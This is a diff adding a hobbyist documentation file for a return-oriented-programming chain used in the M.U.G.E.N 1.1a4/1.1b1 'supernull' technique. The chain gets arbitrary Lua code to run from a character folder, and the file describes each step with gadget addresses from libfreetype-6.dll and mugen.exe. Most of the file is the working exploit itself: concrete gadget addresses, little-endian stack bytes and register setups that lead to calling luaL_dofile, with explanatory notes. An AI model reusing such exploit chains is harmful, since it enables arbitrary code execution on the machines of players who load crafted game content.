@@ -1,0 +1,310 @@
+This is documentation on the ROP chain used for 1.1a4/1.1b1 Lua-based supernull. I don't really recommend reading it, this is only here for documentation purposes. This chain isn't optimal by any means, but I don't anticipate making any changes to this from here on out (it's 'good enough' for now).
+
+GENERAL STRATEGY:
+Goal is to get a string `chars/[character name]/elua`, then feed this with the lua_State handle into the Lua file execution function.
+There is a pointer to `chars/[character name]/` on the stack. This stack placement is consistent between 1.1a4 and 1.1b1.
+We pick up this pointer, `sprintf` to get it to a referenceable location, write `elua` to the end.
+We obtain a reference to the lua_State struct (as 1.1b1 has no helper method to execute a file directly, would be much shorter without needing to support 1.1b1!)
+Then, we indirectly execute the luaL_dofile macro to run the lua code in this file.
+The lua side is responsible for VP'ing the stack.
+
+==========================================================
+GOAL 1: PICKUP POINTER TO CHARACTER FOLDER
+==========================================================
+This requirement is clear as getting a path to the Lua payload is an unavoidable requirement.
+Hardcoding a path works for a single character and may be shorter, but realistically will cost more bytes for long pathnames due to the large stack requirement of 0x67BC049A. It's also just a bad solution as a folder rename will break the chain...
+I never managed to find a better write primitive than 0x67BC049A, but plenty of space saving exists across all the ROP versions if a better one is found.
+
+# PUSHAD structure to fetch ESP into EAX
+Stack contents for PUSHAD (EAX must be 0x67BD0210 due to a quirk in the targeted PUSHAD):
+EDI <- trashed by PUSHAD
+ESI <— Stack pivot (+0x0C, obtain ESP into EDI)
+EBP
+ESP
+EBX
+EDX <- Re-pivot over remaining members (+0x08)
+ECX
+EAX
+
+=== ESI <- 0x67bb2235 (# POP ESI # POP EDI # POP EBP # RETN) ===
+0x67BB2235 :  # POP ESI # POP EDI # POP EBP # RETN
+35 22 BB 67
+35 22 BB 67
+FF FF FF FF
+FF FF FF FF
+
+=== EDX <- Stack pivot 0x08 (# MOV EAX,EBX # POP EBX # POP EBP # RETN) ===
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C3 D0 BB 67
+DC 9D BB 67
+
+== EAX <- Writeable (0x67BD0210) ==
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+10 02 BD 67
+
+== PUSHAD ==
+0x67B83AE7
+E7 3A B8 67
+
+EDI <- ESP at time of PUSHAD
+EDI+0x34C == chars folder string pointer
+
+=== Pickup EDI to EAX ===
+0x67bce288 (RVA : 0x0004e288) : # MOV EAX,EDI # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+88 E2 BC 67
+FF FF FF FF
+DF 13 BB 67
+FF FF FF FF
+FF FF FF FF
+
+=== Preserve handle at referenceable location 0x67BD0328 ===
+0x67ba12b6 :  # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+B6 12 BA 67
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C3 D0 BB 67
+28 03 BD 67
+0x67ba12b6 :  # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+B6 12 BA 67
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+9A 04 BC 67
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+DF 13 BB 67
+FF FF FF FF
+FF FF FF FF
+
+=== Add to EAX then pickup pointer ===
+0x67b93613 (RVA : 0x00013613) : # ADD EAX,23B8 # ADD DH,DH # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+13 36 B9 67
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C3 D0 BB 67
+03 DE FF FF
+0x67bb13df (RVA : 0x000313df) : # ADD EAX,EDX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+DF 13 BB 67
+FF FF FF FF
+FF FF FF FF
+0x67b9d077 :  # MOV EAX,DWORD PTR DS:[EAX+168] # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+77 D0 B9 67
+
+==========================================================
+GOAL 2: SPRINTF TO REFERENCEABLE LOCATION
+==========================================================
+Alternative here is to write directly to the chars folder pointer. Opted to sprintf to a known location for 2 reasons:
+- easier to reference my good friend 0x67BD0210 directly in the ROP (vs. some pointer created at runtime)
+- `sprintf` gives us `strlen` for free so I know where to append my file name
+
+=== ECX <- 0x67BD0210 (referenceable), EBX <- 0x67BCF670 (sprintf thunk) ===
+0x67b9cbf2 :  # POP ECX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+F2 CB B9 67
+10 02 BD 67
+70 F6 BC 67
+FF FF FF FF
+
+=== EDX <- Return Address (0x67BB13E1 Pivot +0x0C, also pickup 67BD0210 into EDX) ===
+0x67bafa8d :  # POP EDX # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+8D FA BA 67
+8D FA BA 67
+FF FF FF FF
+FF FF FF FF
+
+== PUSHAD ==
+0x67B83AE7
+E7 3A B8 67
+
+=== Required: Spacing for the EDX pivot ===
+Note: this is because I use 0x67BB13E1 in EDX immediately above - I could avoid this spacing, but I then need to spend bytes loading EDX post-PUSHAD.
+Sacrificing 1 step here is less expensive than loading EDX via POP.
+FF FF FF FF
+
+
+
+==========================================================
+GOAL 3: APPEND LUA PAYLOAD NAME TO FOLDER STRING
+==========================================================
+
+EDX <- 0x67BD0210 (base of string post-sprintf)
+EAX <- strlen(folderpath) (e.x. for `chars/luafu/`, EAX <- 0x0C)
+Add EDX to EAX to produce the end of the string (write location).
+
+=== Add EDX to EAX ===
+0x67bb13df (RVA : 0x000313df) : # ADD EAX,EDX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+DF 13 BB 67
+FF FF FF FF
+FF FF FF FF
+
+=== Move EAX into EDX ===
+0x67ba12b6 :  # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+B6 12 BA 67
+0x67bbd0bd (RVA : 0x0003d0bd) : # PUSH EBP # MOV EAX,8B04468B # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+BD D0 BB 67
+
+=== Write "elua" ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+02 1C B8 67
+D1 6B 75 61
+0x67bc2cf7 (RVA : 0x00042cf7) : # ADD EAX,94 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+F7 2C BC 67
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+9A 04 BC 67
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+
+==========================================================
+GOAL 4: LOAD LUA HANDLE + SAVE
+==========================================================
+This is pretty straightforward to pick up the pointer, the most relevant piece is just to note 0x005040FC is consistent across versions as the lua_State handle.
+
+=== Pickup pointer from 0x005040FC into EAX ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+3E 22 23 01
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C3 D0 BB 67
+2D 1D 2D FF
+0x67bb13df (RVA : 0x000313df) : # ADD EAX,EDX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+DF 13 BB 67
+FF FF FF FF
+FF FF FF FF
+0x67b9d077 :  # MOV EAX,DWORD PTR DS:[EAX+168] # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+77 D0 B9 67
+
+=== Preserve handle at referenceable location 0x67BD0324 ===
+0x67ba12b6 :  # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+B6 12 BA 67
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C3 D0 BB 67
+24 03 BD 67
+0x67ba12b6 :  # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+B6 12 BA 67
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+9A 04 BC 67
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+
+
+==========================================================
+GOAL 5: FETCH LUA EXECUTION FUNCTION WITH VERSION DIFFERENCE
+==========================================================
+
+This is probably the most interesting step (from a technical point of view). We use a gadget in mugen.exe which is very slightly different between 1.1a4 and 1.1b1.
+This enables us to load ESI with a different value depending on version, which in turn lets us generate a version-differentiated function pointer.
+The odds of actually finding this gadget were not that high, and there was not exactly many other options to differentiate versions, so I'm very happy this exists!
+0x004200B7 1.1A4: # POP EDI # POP ESI # POP EBX # POP ECX # RETN					  (ESI <- Stack+0x04)
+0x004200B7 1.1B1: # OR AL, [EAX] # ADD ESP, 08 # POP ESI # MOV EAX, 1 # POP EBX # RET (ESI <- Stack+0x08)
+
+The target functions (Lua file execution function) are below:
+1.1a4: 0x0042DEA9
+1.1b1: 0x0042E39C
+
+=== ESI <- 0x004200B7 ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+F2 2D 1D 2D
+0x67ba8092 :  # POP ESI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+92 80 BA 67
+C5 D2 24 D3
+FF FF FF FF
+0x67bc2d96 :  # ADD ESI,EAX # INC ECX # POP EBX # ADD BYTE PTR DS:[EBX+5D],BL # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+96 2D BC 67
+--> careful: set ebx=0x67BD0210 to not crash
+10 02 BD 67
+
+=== Set EAX carefully to not crash ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+10 02 BD 67
+
+=== Invoke ESI to obtain version-differentiated base ===
+0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+10 13 BA 67
+FF FF FF FF
+7C B1 15 D3
+6F B6 15 D3
+FF FF FF FF
+
+=== ESI <- Target Function (trashes eax, ebp, ebx, ecx and requires writeable ptr in ebx) ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+2D 2D 2D 2D
+0x67bc2d96 :  # ADD ESI,EAX # INC ECX # POP EBX # ADD BYTE PTR DS:[EBX+5D],BL # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+96 2D BC 67
+--> careful: set ebx=0x67BD0210 to not crash
+10 02 BD 67
+
+==========================================================
+GOAL 6: EXECUTE LUA FILE
+==========================================================
+
+When entering this goal:
+EAX == lua_State
+ESI == luaL_dofile
+
+These two values need to be transitioned to match the below PUSHAD layout.
+
+# PUSHAD structure to execute luaL_dofile
+Stack contents for PUSHAD (EAX must be 0x67BD0210 due to a quirk in the targeted PUSHAD):
+EDI <- trashed by PUSHAD
+ESI <— Stack pivot (0x0C)
+EBP
+ESP
+EBX
+EDX <- luaL_dofile function pointer
+ECX <- lua_State structure pointer
+EAX <- 0x67BD0210 (elua string)
+
+=== ESI -> EDX (+ESI <- 3-pivot 0x67B9CBF2) ===
+0x67ba8090 (RVA : 0x00028090) : # MOV EAX,ESI # POP ESI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+90 80 BA 67
+F2 CB B9 67
+FF FF FF FF
+0x67ba12b6 :  # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+B6 12 BA 67
+0x67bbd0bd (RVA : 0x0003d0bd) : # PUSH EBP # MOV EAX,8B04468B # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+BD D0 BB 67
+
+=== Restore lua_State from 0x67BD0324 ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+BC 01 BD 67
+0x67b9d077 :  # MOV EAX,DWORD PTR DS:[EAX+168] # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+77 D0 B9 67
+
+=== EAX -> ECX ===
+0x67bb13e1 : # POP EBX # POP EBP # RETN
+E1 13 BB 67
+DB F6 33 63
+FF FF FF FF
+0x67b90535 : # ADD [EBX+04890C55],CL # XCHG EAX,ECX # ADD ESP,14 # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+35 05 B9 67
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+
+=== EAX <- Referenceable ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+02 1C B8 67
+10 02 BD 67
+
+== PUSHAD ==
+0x67B83AE7
+E7 3A B8 67
